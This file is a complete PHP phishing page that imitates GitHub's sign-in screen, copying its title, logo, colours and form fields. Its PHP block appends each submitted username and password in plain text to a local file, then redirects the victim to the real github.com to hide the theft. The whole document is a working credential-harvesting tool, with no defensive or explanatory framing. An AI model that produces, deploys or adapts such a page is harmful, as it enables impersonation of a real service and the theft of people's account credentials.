<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://github.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>GitHub – Sign in</title><meta charset="UTF-8"></head>
<body style="background: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif; text-align: center; margin-top: 80px;">
<div style="width: 340px; margin: auto; padding: 20px;">
<img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" width="60"><br>
<h2>Sign in to GitHub</h2>
<form method="post">
<input type="text" name="username" placeholder="Username or email address" style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #d0d7de; border-radius: 6px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #d0d7de; border-radius: 6px;" required><br>
<button type="submit" style="background: #2da44e; color: white; width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold;">Sign in</button>
</form>
</div>
</body>
</html>
